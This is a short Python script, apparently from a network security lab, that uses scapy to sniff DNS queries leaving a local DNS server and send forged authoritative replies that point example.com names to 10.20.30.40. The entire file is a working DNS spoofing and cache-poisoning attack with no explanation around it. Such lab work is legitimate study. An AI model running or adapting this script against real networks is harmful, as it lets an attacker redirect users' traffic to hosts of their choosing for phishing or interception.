#!/usr/bin/env python3
from scapy.all import *
import sys

"""
Flush the DNS cache on local DNS server before with
rndc flush 
"""

NS_NAME = "example.com"


def spoof_dns(pkt):
        if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):
                print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Create an IP object
                udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UPD object

                Anssec = DNSRR(rrname=pkt[DNS]. qd.qname, type='A',rdata='10.20.30.40',ttl=259200)

                # Construct the DNS packet
                dns = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd, aa=1, qr=1, qdcount=1, ancount=1, an=Anssec)
                spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                send(spoofpkt)


myFilter = "udp and (src host 10.9.0.53 and dst port 53)" # Set the filter
pkt=sniff(iface='br-1d24810f49e2', filter=myFilter, prn=spoof_dns)